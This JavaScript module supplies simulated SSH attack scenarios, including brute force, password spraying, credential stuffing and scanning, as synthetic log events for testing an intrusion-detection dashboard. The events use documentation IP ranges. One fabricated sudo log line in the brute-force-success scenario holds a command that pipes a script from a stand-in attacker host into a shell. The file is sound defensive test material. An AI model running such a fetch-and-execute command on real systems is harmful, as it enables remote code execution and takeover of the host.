// Attack scenarios shared by the web "attack test" page (routes/simulateRoutes.js) and tools/simulate.js.
// Source IPs come from the reserved documentation ranges (RFC 5737), so they never belong to a real host.

const MIN = 60000;
const NET = { a: "203.0.113", b: "198.51.100", c: "192.0.2" };
const SEV = { ssh_login_failed: "warning", ssh_invalid_user: "high", connection_closed_preauth: "low" };

// Documentation IPs have no country; the web simulator gives each attacker a made-up one so the globe shows it.
const DEMO_COUNTRIES = ["CN", "RU", "US", "BR", "VN", "IN", "NL", "DE", "KR", "ID", "IR", "UA"];
function demoCountry(ip) {
  const m = /^(203\.0\.113|198\.51\.100|192\.0\.2)\.(\d+)$/.exec(ip || "");
  return m ? DEMO_COUNTRIES[(Number(m[2]) + m[1].length) % DEMO_COUNTRIES.length] : null;
}

// run: a number unique per run, so each run opens fresh incidents
function makeScenarios(run) {
  // Each scenario gets a disjoint block of host octets within its /24, so one scenario's attacker IP
  // can never coincide with a DIFFERENT scenario's IP from an earlier run. (Previously the offsets were
  // only +1 apart, so a run whose random `run` was one higher than an earlier run reused that run's
  // "successful login" IP — the fresh brute force was then reclassified as brute_force_success and hidden.)
  // Within its block the octet still varies with `run`, so repeated runs still open fresh incidents.
  const BLOCK = 40;
  const ip = (range, lane = 0) => `${range}.${lane * BLOCK + (run % BLOCK) + 1}`;
  const T = (minAgo) => new Date(Date.now() - minAgo * MIN).toISOString();
  const ev = (minAgo, type, user, addr, extra = {}) => ({
    timestamp: typeof minAgo === "string" ? minAgo : T(minAgo),
    event_type: type,
    username: user || undefined,
    ip_address: addr || undefined,
    port: String(20000 + Math.floor(Math.random() * 40000)),
    severity: SEV[type] || "info",
    ...extra,
  });

  return [
    {
      name: "baseline",
      label: "การใช้งานปกติ",
      desc: "Every plain event type: login success (password + key), sudo, session closed, one typo'd password",
      desc_th: "ล็อกอินสำเร็จ ใช้ sudo ปิดเซสชัน และพิมพ์รหัสผิดหนึ่งครั้งแล้วเข้าได้",
      hosts: 1,
      build: () => {
        const l = [];
        for (let i = 0; i < 4; i++) l.push(ev(600 - i * 90, "ssh_login_success", "alice", "10.0.4.21", { auth_method: i % 2 ? "publickey" : "password" }));
        l.push(ev(40, "sudo_command", "alice", null, { message: "sudo /usr/bin/apt update" }));
        l.push(ev(39, "session_closed", "alice", null));
        l.push(ev(12, "ssh_login_failed", "bob", "10.0.4.30")); // one typo...
        l.push(ev(11, "ssh_login_success", "bob", "10.0.4.30")); // ...then fine -> must NOT become an incident
        return { 0: l };
      },
      expect: "No incident (a typo followed by a login is normal).",
      expect_th: "ต้องไม่เกิดเหตุการณ์ (พิมพ์ผิดแล้วเข้าได้ถือว่าปกติ)",
    },
    {
      name: "brute_force",
      label: "เดารหัสผ่าน (Brute force)",
      desc: "Many wrong passwords against one account from one IP, no success",
      desc_th: "ใส่รหัสผิด 24 ครั้งกับบัญชีเดียวจาก IP เดียว",
      hosts: 1,
      build: () => ({ 0: Array.from({ length: 24 }, (_, i) => ev(6 - i * 0.2, "ssh_login_failed", "webadmin", ip(NET.a, 0))) }),
      expect: "Brute force, risk MEDIUM (>=5) / HIGH (>=20).",
      expect_th: "Brute force ความเสี่ยงสูง (HIGH)",
    },
    {
      name: "brute_force_success",
      label: "เดารหัสสำเร็จแล้วใช้ sudo",
      desc: "Wrong passwords, then a successful login from the same IP, then sudo",
      desc_th: "ใส่รหัสผิดหลายครั้ง แล้วล็อกอินสำเร็จเป็น root และรันคำสั่งอันตราย",
      hosts: 1,
      build: () => {
        const a = ip(NET.a, 1);
        const l = Array.from({ length: 9 }, (_, i) => ev(14 - i * 0.4, "ssh_login_failed", "root", a));
        l.push(ev(9, "ssh_login_success", "root", a, { auth_method: "password" }));
        l.push(ev(8, "sudo_command", "root", null, { message: "sudo /bin/bash -c 'curl http://evil.example/x.sh | sh'" }));
        return { 0: l };
      },
      expect: "CRITICAL: login after many failures + post-compromise privileged activity.",
      expect_th: "วิกฤต (CRITICAL): ถูกเจาะสำเร็จและมีการใช้สิทธิ์สูง",
    },
    {
      name: "username_enumeration",
      label: "สุ่มเดาชื่อผู้ใช้",
      desc: "Dozens of non-existent usernames from one IP",
      desc_th: "ลองชื่อผู้ใช้ที่ไม่มีอยู่จริง 22 ชื่อจาก IP เดียว",
      hosts: 1,
      build: () => {
        const names = ["admin1", "test", "oracle", "postgres", "ubuntu", "git", "ftp", "user", "guest", "pi", "mysql", "nagios", "jenkins", "tomcat", "support", "info", "demo", "backup", "dev", "web", "deploy9", "vagrant"];
        return { 0: names.map((u, i) => ev(5 - i * 0.15, "ssh_invalid_user", u, ip(NET.b, 0))) };
      },
      expect: "Username enumeration, HIGH (>=20 usernames).",
      expect_th: "Username enumeration ความเสี่ยงสูง (HIGH)",
    },
    {
      name: "password_spraying",
      label: "ลองรหัสเดียวกับหลายบัญชี",
      desc: "Few tries per real account, spread across many accounts, slowly",
      desc_th: "ลอง 2 ครั้งต่อบัญชี กับ 6 บัญชี กระจายใน 50 นาที",
      hosts: 1,
      build: () => {
        const a = ip(NET.b, 1);
        const l = [];
        ["alice", "deploy", "ubuntu", "admin", "www-data", "backup"].forEach((u, i) => {
          l.push(ev(52 - i * 7, "ssh_login_failed", u, a), ev(50 - i * 7, "ssh_login_failed", u, a));
        });
        return { 0: l };
      },
      expect: "Password spraying, HIGH (6 accounts x 2 tries over ~50 min).",
      expect_th: "Password spraying ความเสี่ยงสูง (HIGH)",
    },
    {
      name: "credential_stuffing",
      label: "ใช้รหัสที่รั่วไหล",
      desc: "A leaked list: many accounts tried once each, quickly; one of them works",
      desc_th: "ลอง 15 บัญชี บัญชีละครั้งอย่างรวดเร็ว และบัญชี deploy เข้าได้",
      hosts: 1,
      build: () => {
        const a = ip(NET.c, 0);
        const users = ["john", "mary", "deploy", "git", "jenkins", "oracle", "mysql", "test", "guest", "pi", "support", "dev", "ops", "sales", "hr"];
        const l = users.map((u, i) => ev(20 - i * 0.3, i % 4 === 3 ? "ssh_invalid_user" : "ssh_login_failed", u, a));
        l.push(ev(14, "ssh_login_success", "deploy", a, { auth_method: "password" }));
        return { 0: l };
      },
      expect: 'CRITICAL credential stuffing, account "deploy" marked compromised.',
      expect_th: "วิกฤต (CRITICAL): บัญชี deploy ถูกเจาะ",
    },
    {
      name: "compromised_account",
      label: "บัญชีที่ถูกเจาะถูกใช้ซ้ำ",
      desc: 'Account "deploy" (breached above) now attacked from other IPs, one succeeds',
      desc_th: "บัญชี deploy (ถูกเจาะในข้อก่อน) ถูกลองเข้าจาก IP อื่น และเข้าได้ (ต้องจำลองข้อ \"ใช้รหัสที่รั่วไหล\" ก่อน)",
      hosts: 1,
      build: () => ({
        0: [
          ev(6, "ssh_login_failed", "deploy", ip(NET.a, 3)),
          ev(4, "ssh_login_failed", "deploy", ip(NET.a, 4)),
          ev(3, "ssh_login_success", "deploy", ip(NET.a, 4), { auth_method: "password" }),
        ],
      }),
      expect: "CRITICAL repeated attempts on a compromised account (needs credential_stuffing run first).",
      expect_th: "วิกฤต (CRITICAL) ถ้าจำลองข้อ \"ใช้รหัสที่รั่วไหล\" ไว้ก่อน",
    },
    {
      name: "ssh_scanning",
      label: "สแกนพอร์ต SSH",
      desc: "Connections dropped before authentication (port scanner / fingerprinting)",
      desc_th: "เชื่อมต่อแล้วตัดก่อนล็อกอิน 16 ครั้ง (เครื่องมือสแกน)",
      hosts: 1,
      build: () => ({ 0: Array.from({ length: 16 }, (_, i) => ev(7 - i * 0.3, "connection_closed_preauth", null, ip(NET.c, 1))) }),
      expect: "SSH scanning, MEDIUM (>=10) / HIGH (>=50).",
      expect_th: "SSH scanning ความเสี่ยงปานกลาง (MEDIUM)",
    },
    {
      name: "abnormal_burst",
      label: "เชื่อมต่อถี่ผิดปกติ",
      desc: "25+ events from one IP inside one minute (automated tooling)",
      desc_th: "28 ครั้งจาก IP เดียวภายใน 1 นาที (โปรแกรมอัตโนมัติ)",
      hosts: 1,
      build: () => {
        const a = ip(NET.a, 2);
        return { 0: Array.from({ length: 28 }, (_, i) => ev(new Date(Date.now() - 4 * MIN + i * 1500).toISOString(), "ssh_login_failed", "scanner", a)) };
      },
      expect: "Abnormal source behavior: burst, HIGH.",
      expect_th: "Abnormal burst ความเสี่ยงสูง (HIGH)",
    },
    {
      name: "new_source_login",
      label: "ล็อกอินจากที่ใหม่",
      desc: 'Known user "alice" logs in from an IP never seen before',
      desc_th: "ผู้ใช้ alice ล็อกอินจาก IP ที่ไม่เคยใช้มาก่อน (ต้องจำลองข้อ \"การใช้งานปกติ\" ก่อน)",
      hosts: 1,
      build: () => ({ 0: [ev(1, "ssh_login_success", "alice", ip(NET.b, 2), { auth_method: "password" })] }),
      expect: "Login from new source, MEDIUM (HIGH if 00:00-05:59 Bangkok time or the IP attacked before).",
      expect_th: "Login from new source ความเสี่ยงปานกลาง (MEDIUM) หรือสูง (HIGH) ถ้าเป็นช่วง 00:00-05:59 หรือ IP นี้เคยโจมตีมาก่อน",
    },
    {
      name: "cross_host",
      label: "โจมตีหลายเซิร์ฟเวอร์",
      desc: "One attacker IP probes several of your servers (needs 2+ keys: --key k1,k2)",
      desc_th: "IP เดียวกันโจมตีเซิร์ฟเวอร์ทดสอบทั้ง 2 เครื่อง",
      hosts: 2,
      build: () => {
        const a = ip(NET.b, 3);
        return {
          0: [ev(9, "ssh_login_failed", "operator", a), ev(8.5, "ssh_login_failed", "svc", a), ev(8, "connection_closed_preauth", null, a)],
          1: [ev(7, "ssh_invalid_user", "postgres", a), ev(6.5, "ssh_login_failed", "operator", a)],
        };
      },
      expect: "Cross-host campaign, HIGH, one incident per server.",
      expect_th: "Cross-host campaign ความเสี่ยงสูง (HIGH) บนทั้ง 2 เครื่อง",
    },
  ];
}

function makeLivePool() {
  const T = () => new Date().toISOString();
  const rnd = (n) => Math.floor(Math.random() * n);
  const ev = (type, user, addr, extra = {}) => ({ timestamp: T(), event_type: type, username: user || undefined, ip_address: addr || undefined, severity: SEV[type] || "info", ...extra });
  return [
    () => ev("ssh_login_success", ["alice", "bob", "carol"][rnd(3)], "10.0.4." + (20 + rnd(5))),
    () => ev("ssh_login_failed", ["root", "admin", "ubuntu"][rnd(3)], `${NET.a}.${1 + rnd(250)}`),
    () => ev("ssh_invalid_user", "user" + rnd(99), `${NET.b}.${1 + rnd(250)}`),
    () => ev("connection_closed_preauth", null, `${NET.c}.${1 + rnd(250)}`),
    () => ev("sudo_command", "alice", null, { message: "sudo systemctl restart nginx" }),
    () => ev("session_closed", "alice", null),
  ];
}

module.exports = { makeScenarios, makeLivePool, demoCountry };
